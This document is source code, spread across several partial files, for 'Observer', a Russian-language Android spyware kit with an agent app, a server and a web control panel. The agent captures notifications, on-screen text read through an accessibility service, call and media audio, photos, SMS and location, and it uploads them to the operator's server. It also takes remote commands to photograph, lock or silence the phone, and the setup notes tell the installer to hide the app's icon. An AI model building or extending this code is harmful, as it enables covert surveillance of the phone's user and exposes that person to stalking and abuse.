class NotifListener : NotificationListenerService() {
    private val skip = setOf("android", "com.android.systemui", "ru.observer.app")

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        if (pkg in skip) return
        val ex = sbn.notification.extras ?: return
        val title = ex.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString() ?: return
        val body = ex.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
        val label = Util.label(this, pkg)
        CoroutineScope(Dispatchers.IO).launch {
            Db.get(this@NotifListener).dao().add(Event(kind = "notif", app = label,
                contact = "$label|$title", title = title, body = body, src = "notif"))
            Sync.now(this@NotifListener)
        }
    }
}

class A11yService : android.accessibilityservice.AccessibilityService() {
    private var last = ""
    private var at = 0L

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        e ?: return
        if (e.packageName == packageName) return
        val now = System.currentTimeMillis()
        if (now - at < 2000) return
        at = now
        val root = rootInActiveWindow ?: return
        val sb = StringBuilder()
        walk(root, sb, 0)
        val text = sb.toString().trim()
        if (text.length < 10 || text == last) return
        last = text
        val pkg = e.packageName?.toString() ?: return
        val label = Util.label(this, pkg)
        CoroutineScope(Dispatchers.IO).launch {
            Db.get(this@A11yService).dao().add(Event(kind = "screen", app = label,
                contact = "$label|экран", title = "экран", body = text.take(1000), src = "screen"))
            Sync.now(this@A11yService)
        }
    }

    private fun walk(n: AccessibilityNodeInfo?, sb: StringBuilder, d: Int) {
        n ?: return
        if (d > 12) return
        n.text?.toString()?.takeIf { it.isNotBlank() }?.let { sb.append(it).append('\n') }
        for (i in 0 until n.childCount) walk(n.getChild(i), sb, d + 1)
    }
}

class AudioCaptureService : Service() {
    private var rec: AudioRecord? = null
    private var run = false

    override fun onStartCommand(i: Intent?, f: Int, s: Int): Int {
        startForeground(3, ch(this, "aud", "Звук"))
        if (Build.VERSION.SDK_INT < 29) { stopSelf(); return START_NOT_STICKY }
        val code = i?.getIntExtra("code", 0) ?: 0
        val data = i?.getParcelableExtra<Intent>("data") ?: run { stopSelf(); return START_NOT_STICKY }
        val proj: MediaProjection = getSystemService(MediaProjectionManager::class.java)
            .getMediaProjection(code, data)
        val cfg = AudioPlaybackCaptureConfiguration.Builder(proj)
            .addMatchingUsage(AudioAttributes.USAGE_MEDIA)
            .addMatchingUsage(AudioAttributes.USAGE_VOICE_COMMUNICATION).build()
        val fmt = AudioFormat.Builder().setEncoding(AudioFormat.ENCODING_PCM_16BIT)
            .setSampleRate(44100).setChannelMask(AudioFormat.CHANNEL_IN_MONO).build()
        val buf = AudioRecord.getMinBufferSize(44100, AudioFormat.CHANNEL_IN_MONO,
            AudioFormat.ENCODING_PCM_16BIT).coerceAtLeast(8192) * 2
        rec = AudioRecord.Builder().setAudioFormat(fmt).setBufferSizeInBytes(buf)
            .setAudioPlaybackCaptureConfig(cfg).build()
        val file = File(cacheDir, "v_${System.currentTimeMillis()}.wav")
        run = true
        rec?.startRecording()
        Thread {
            val os = FileOutputStream(file)
            os.write(ByteArray(44))
            val b = ByteArray(buf)
            var total = 0
            val t0 = System.currentTimeMillis()
            while (run && System.currentTimeMillis() - t0 < 30_000) {
                val n = rec?.read(b, 0, b.size) ?: 0
                if (n > 0) { os.write(b, 0, n); total += n }
            }
            os.close(); wav(file, total)
            rec?.release(); rec = null
            Api.upload(this, file, "voice", (System.currentTimeMillis() - t0).toInt()) { file.delete() }
            CoroutineScope(Dispatchers.IO).launch {
                Db.get(this@AudioCaptureService).dao().add(Event(kind = "voice", title = "звук",
                    contact = "Звук|запись", src = "capture", synced = true))
            }
            stopSelf()
        }.start()
        return START_NOT_STICKY
    }

    private fun wav(f: File, len: Int) {
        try {
            val raf = java.io.RandomAccessFile(f, "rw"); raf.seek(0)
            val h = ByteArray(44)
            fun p(v: Int, o: Int) {
                h[o] = v.toByte(); h[o + 1] = (v shr 8).toByte()
                h[o + 2] = (v shr 16).toByte(); h[o + 3] = (v shr 24).toByte()
            }
            "RIFF".forEachIndexed { i, c -> h[i] = c.code.toByte() }
            p(36 + len, 4); "WAVEfmt ".forEachIndexed { i, c -> h[8 + i] = c.code.toByte() }
            p(16, 16); p(1, 20); p(1, 22); p(44100, 24); p(88200, 28); p(2, 32); p(16, 34)
            "data".forEachIndexed { i, c -> h[36 + i] = c.code.toByte() }; p(len, 40)
            raf.write(h); raf.close()
        } catch (e: Exception) {}
    }

    override fun onDestroy() { run = false; super.onDestroy() }
    override fun onBind(i: Intent?): IBinder? = null
    companion object {
        fun start(c: Context, code: Int, data: Intent) = ContextCompat.startForegroundService(
            c, Intent(c, AudioCaptureService::class.java).putExtra("code", code).putExtra("data", data))
    }

package ru.observer.app.net

import android.content.Context
import okhttp3.*
import okhttp3.MediaType.Companion.toMediaType
import org.json.JSONArray
import org.json.JSONObject
import ru.observer.app.data.Event
import ru.observer.app.data.Prefs
import java.io.File
import java.util.concurrent.TimeUnit

object Api {
    private val http = OkHttpClient.Builder()
        .connectTimeout(20, TimeUnit.SECONDS).readTimeout(30, TimeUnit.SECONDS).build()

    fun enroll(c: Context, code: String, name: String, cb: (Boolean, String) -> Unit) {
        val b = JSONObject().put("code", code).put("name", name)
            .put("model", android.os.Build.MODEL)
            .put("android", android.os.Build.VERSION.RELEASE).toString()
        val r = Request.Builder().url(Prefs.base + "/api/enroll")
            .post(b.toRequestBody("application/json".toMediaType())).build()
        http.newCall(r).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) = cb(false, e.message ?: "сеть")
            override fun onResponse(call: Call, res: Response) = res.use {
                if (!res.isSuccessful) return cb(false, "код отклонён")
                Prefs.token = JSONObject(res.body!!.string()).getString("token")
                cb(true, "")
            }
        })
    }

    fun push(c: Context, list: List<Event>, cb: (Boolean) -> Unit) {
        if (list.isEmpty()) return cb(true)
        val arr = JSONArray()
        list.forEach {
            arr.put(JSONObject().put("kind", it.kind).put("app", it.app)
                .put("contact", it.contact).put("title", it.title)
                .put("body", it.body).put("src", it.src))
        }
        val r = Request.Builder().url(Prefs.base + "/api/events")
            .header("X-Device-Token", Prefs.token)
            .post(arr.toString().toRequestBody("application/json".toMediaType())).build()
        http.newCall(r).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) = cb(false)
            override fun onResponse(call: Call, res: Response) { res.use { cb(res.isSuccessful) } }
        })
    }

    fun upload(c: Context, f: File, kind: String, dur: Int, cb: (Boolean) -> Unit) {
        val body = MultipartBody.Builder().setType(MultipartBody.FORM)
            .addFormDataPart("file", f.name, f.asRequestBody("application/octet-stream".toMediaType())).build()
        val r = Request.Builder().url("${Prefs.base}/api/media?kind=$kind&dur=$dur")
            .header("X-Device-Token", Prefs.token).post(body).build()
        http.newCall(r).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) = cb(false)
            override fun onResponse(call: Call, res: Response) { res.use { cb(res.isSuccessful) } }
        })
    }

    fun loc(c: Context, lat: Double, lon: Double) {
        val b = JSONObject().put("lat", lat).put("lon", lon).toString()
        val r = Request.Builder().url(Prefs.base + "/api/loc")
            .header("X-Device-Token", Prefs.token)
            .post(b.toRequestBody("application/json".toMediaType())).build()
        http.newCall(r).enqueue(object : Callback {
            override fun onFailure(call: Call, e: java.io.IOException) {}
            override fun onResponse(call: Call, res: Response) { res.close() }
        })
    }
}

        if (on || Prefs.token.isEmpty()) return
        on = true
        connect(c.applicationContext)
    }

    private fun connect(c: Context) {
        val url = Prefs.base.replace("https://", "wss://").replace("http://", "ws://") +
                "/ws/device?token=" + Prefs.token
        http.newWebSocket(Request.Builder().url(url).build(), object : WebSocketListener() {
            override fun onOpen(w: WebSocket, r: Response) { backoff = 1000L }
            override fun onMessage(w: WebSocket, text: String) {
                if (text.contains("ping")) return
                when (JSONObject(text).optString("kind")) {
                    "photo_front" -> CaptureService.shoot(c, true)
                    "photo_back" -> CaptureService.shoot(c, false)
                    "loc" -> Sync.now(c)
                    "lock" -> c.getSystemService(android.app.admin.DevicePolicyManager::class.java).lockNow()
                    "silent" -> c.getSystemService(android.media.AudioManager::class.java)
                        .ringerMode = android.media.AudioManager.RINGER_MODE_SILENT
                }
            }
            override fun onFailure(w: WebSocket, t: Throwable, r: Response?) {
                on = false
                Handler(Looper.getMainLooper()).postDelayed({ start(c) }, backoff)
                backoff = (backoff * 2).coerceAtMost(120_000L)
            }
        })
    }
}

package ru.observer.app.sync

import android.content.Context
import androidx.work.*
import kotlinx.coroutines.runBlocking
import ru.observer.app.data.Dao
import ru.observer.app.data.Db
import ru.observer.app.net.Api
import ru.observer.app.net.Ws
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit

object Sync {
    fun start(c: Context) {
        val req = PeriodicWorkRequestBuilder<W>(15, TimeUnit.MINUTES).build()
        WorkManager.getInstance(c).enqueueUniquePeriodicWork("sync", ExistingPeriodicWorkPolicy.UPDATE, req)
    }

    fun now(c: Context) {
        WorkManager.getInstance(c).enqueue(OneTimeWorkRequestBuilder<W>().setConstraints(
            Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED).build()).build())
    }

    class W(c: Context, p: WorkerParameters) : Worker(c, p) {
        override fun doWork(): Result {
            val ctx = applicationContext
            Ws.start(ctx)
            val dao: Dao = Db.get(ctx).dao()
            val list = runBlocking { dao.unsynced() }
            if (list.isEmpty()) return Result.success()
            val latch = CountDownLatch(1)
            var ok = false
            Api.push(ctx, list) { r -> ok = r; latch.countDown() }
            latch.await(30, TimeUnit.SECONDS)
            if (ok) runBlocking { dao.mark(list.map { it.id }) }
            return Result.success()
        }
    }
}

# Observer

Агент Android + сервер + веб-панель.

## 1. Сервер
    cd server
    cp .env.example .env
    bash scripts/init.sh
    nano .env            # вписать DOMAIN
    mkdir -p dist
    docker compose up -d --build

Панель: https://ДОМЕН/panel — пароль из .env (ADMIN_PASSWORD)

## 2. Код привязки
    curl -X POST -H "X-Admin-Token: ПАРОЛЬ" https://ДОМЕН/api/codes

## 3. APK
    cd android
    Android Studio -> Open -> Build APK(s)

APK положить в server/dist/app.apk, ссылка https://ДОМЕН/app/app.apk

## 4. Установка
Открыть APK, ввести адрес сервера и код, выдать разрешения, «Скрыть иконку».

## Что собирается
Уведомления, SMS, вызовы, геолокация, текст экрана, звук, фото.

app = FastAPI()
pool = None

class Bus:
    def init(self): self.subs = {}
    def sub(self, ch, ws): self.subs.setdefault(ch, set()).add(ws)
    def unsub(self, ch, ws): self.subs.get(ch, set()).discard(ws)
    async def pub(self, ch, data):
        for ws in list(self.subs.get(ch, ())):
            try: await ws.send_text(json.dumps(data))
            except Exception: self.unsub(ch, ws)

bus = Bus()

@app.on_event("startup")
async def _up():
    global pool
    pool = await asyncpg.create_pool(DB, min_size=1, max_size=8)
    asyncio.create_task(keepalive())

async def keepalive():
    while True:
        await asyncio.sleep(25)
        for ch in list(bus.subs):
            for ws in list(bus.subs[ch]):
                try: await ws.send_text('{"ping":1}')
                except Exception: bus.unsub(ch, ws)

def sign(key):
    e = int(time.time()) + 3600
    s = hmac.new(SECRET, f"{key}:{e}".encode(), hashlib.sha256).hexdigest()[:32]
    return f"/m/{key}?e={e}&s={s}"

def admin(t: Optional[str] = Header(None, alias="X-Admin-Token")):
    if not t or not secrets.compare_digest(t, ADMIN): raise HTTPException(401)

    if not r: raise HTTPException(401)
    return str(r["id"])

CREATE TABLE devices (
  id uuid PRIMARY KEY DEFAULT gen_random_uuid(),
  name text NOT NULL,
  model text,
  android text,
  token text UNIQUE NOT NULL,
  enrolled_at timestamptz NOT NULL DEFAULT now(),
  last_seen timestamptz,
  online boolean NOT NULL DEFAULT false,
  revoked boolean NOT NULL DEFAULT false
);
CREATE TABLE codes (
  code text PRIMARY KEY,
  used boolean NOT NULL DEFAULT false,
  created_at timestamptz NOT NULL DEFAULT now()
);
CREATE TABLE events (
  id bigserial PRIMARY KEY,
  device_id uuid NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  ts timestamptz NOT NULL DEFAULT now(),
  kind text NOT NULL,
  app text DEFAULT '',
  contact text DEFAULT '',
  title text DEFAULT '',
  body text DEFAULT '',
  src text DEFAULT ''
);
CREATE INDEX ON events (device_id, ts DESC);
CREATE TABLE media (
  id bigserial PRIMARY KEY,
  device_id uuid NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  ts timestamptz NOT NULL DEFAULT now(),
  kind text,
  path text,
  size int,
  dur int DEFAULT 0
);
CREATE TABLE commands (
  id bigserial PRIMARY KEY,
  device_id uuid NOT NULL REFERENCES devices(id) ON DELETE CASCADE,
  ts timestamptz NOT NULL DEFAULT now(),
  kind text NOT NULL,
  done_at timestamptz
);

===FILE server/panel/app.js===
const API = location.origin;
let token = sessionStorage.getItem('tok') || '';
let devId = '';
let tab = 'chats';
let ws;
const $ = id => document.getElementById(id);

async function api(path, opt) {
  opt = opt || {};
  opt.headers = Object.assign({ 'X-Admin-Token': token }, opt.headers || {});
  const r = await fetch(API + path, opt);
  if (r.status === 401) { logout(); throw new Error('401'); }
  return r;
}
function logout() { sessionStorage.removeItem('tok'); location.reload(); }

$('go').onclick = async () => {
  const r = await fetch(API + '/api/login', { method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ password: $('pass').value }) });
  if (!r.ok) { $('err').textContent = 'неверный пароль'; return; }
  token = (await r.json()).token;
  sessionStorage.setItem('tok', token);
  start();
};
$('out').onclick = logout;

async function start() {
  $('login').hidden = true; $('app').hidden = false;
  const devs = await (await api('/api/devices')).json();
  $('dev').innerHTML = devs.map(d => `<option value="${d.id}">${d.name}</option>`).join('') || '<option>нет</option>';
  devId = devs[0] ? devs[0].id : '';
  $('dev').onchange = () => { devId = $('dev').value; draw(); };
  $('nav').innerHTML = ['Чаты', 'Медиа', 'Карта', 'Команды'].map((n, i) => `<button data-t="${i}">${n}</button>`).join('');
  document.querySelectorAll('[data-t]').forEach(b => b.onclick = () => { tab = +b.dataset.t; draw(); });
  connectWs(); draw();
}

function connectWs() {
  ws = new WebSocket(API.replace('https', 'wss') + '/ws/panel?token=' + token);
  ws.onmessage = e => {
    const m = JSON.parse(e.data);
    if (m.ping) return;
    if (m.t === 'device') return start();
    if (m.device === devId) draw();
  };
  ws.onclose = () => setTimeout(connectWs, 3000);
}

async function draw() {
  document.querySelectorAll('[data-t]').forEach(b => b.classList.toggle('on', +b.dataset.t === tab));
  const m = $('main');
  if (!devId) { m.innerHTML = '<p class="dim">Устройств нет</p>'; return; }
  const st = await (await api('/api/devices')).json();
  const cur = st.find(d => d.id === devId);
  $('status').textContent = cur && cur.online ? 'онлайн' : 'офлайн';
  $('status').className = 'st ' + (cur && cur.online ? 'on' : 'off');

  if (tab === 0) {
    const rows = await (await api(`/api/devices/${devId}/chats`)).json();
    m.innerHTML = rows.map(r => `<div class="row" data-c="${encodeURIComponent(r.contact)}">
      <div><div class="nm">${r.contact.split('|').pop()}</div>
      <div class="dim">${r.contact.split('|')[0]} · ${r.n}</div></div></div>`).join('') || '<p class="dim">Пусто</p>';
    document.querySelectorAll('[data-c]').forEach(el => el.onclick = () => openChat(decodeURIComponent(el.dataset.c)));
  }
  if (tab === 1) {
    const items = await (await api(`/api/devices/${devId}/media`)).json();
    m.innerHTML = '<div class="grid">' + items.map(i => `<div class="card">
      ${i.kind.indexOf('photo') === 0 ? `<img src="${i.url}" loading="lazy">` : `<video src="${i.url}" controls preload="none"></video>`}
      <div class="m">${i.kind}</div></div>`).join('') + '</div>';
  }
  if (tab === 2) {
    const pts = await (await api(`/api/devices/${devId}/locations`)).json();
    m.innerHTML = '<canvas id="cv"></canvas>';
    const cv = $('cv'), ctx = cv.getContext('2d');
    cv.width = cv.clientWidth; cv.height = 320;
    if (!pts.length) return;
    const co = pts.map(p => p.body.split(',').map(Number)).reverse();
    const xs = co.map(c => c[0]), ys = co.map(c => c[1]);
    const mnX = Math.min.apply(null, xs), mxX = Math.max.apply(null, xs);
    const mnY = Math.min.apply(null, ys), mxY = Math.max.apply(null, ys);
    const px = v => 20 + (v - mnX) / ((mxX - mnX) || 1) * (cv.width - 40);
    const py = v => 20 + (v - mnY) / ((mxY - mnY) || 1) * (cv.height - 40);
    ctx.strokeStyle = '#4da3ff'; ctx.lineWidth = 2; ctx.beginPath();
    co.forEach((c, i) => i ? ctx.lineTo(px(c[0]), py(c[1])) : ctx.moveTo(px(c[0]), py(c[1])));
    ctx.stroke();
    const l = co[co.length - 1];
    ctx.fillStyle = '#4da3ff'; ctx.beginPath(); ctx.arc(px(l[0]), py(l[1]), 5, 0, 7); ctx.fill();
  }
  if (tab === 3) {
    const cmds = [['photo_front', 'Фото фронталка'], ['photo_back', 'Фото тыл'], ['mic30', 'Запись 30 с'],
                  ['loc', 'Геопозиция'], ['lock', 'Заблокировать'], ['silent', 'Тихий режим']];
    m.innerHTML = '<div class="cmds">' + cmds.map(c => `<button data-k="${c[0]}">${c[1]}</button>`).join('') + '</div>';
    document.querySelectorAll('[data-k]').forEach(b => b.onclick = async () => {
      await api(`/api/devices/${devId}/cmd?kind=${b.dataset.k}`, { method: 'POST' });
      b.textContent = 'отправлено'; setTimeout(draw, 1200);
    });
  }
}

async function openChat(contact) {
  const msgs = await (await api(`/api/devices/${devId}/chat?contact=${encodeURIComponent(contact)}`)).json();
  $('main').innerHTML = '<button onclick="draw()">← назад</button>' +
    msgs.map(m => `<div class="bub ${m.src === 'screen' ? 'out' : ''}">${m.body}
      <div class="bt">${new Date(m.ts).toLocaleTimeString('ru-RU')} · ${m.src}</div></div>`).join('');
}
if (token) start();

#!/bin/sh
set -e
psql "$DATABASE_URL" -c "DELETE FROM events WHERE ts < now() - interval '60 days' AND kind IN ('notif','screen','sms','call','loc')"

U=$(df /data | tail -1 | awk '{print $5}' | tr -d '%')
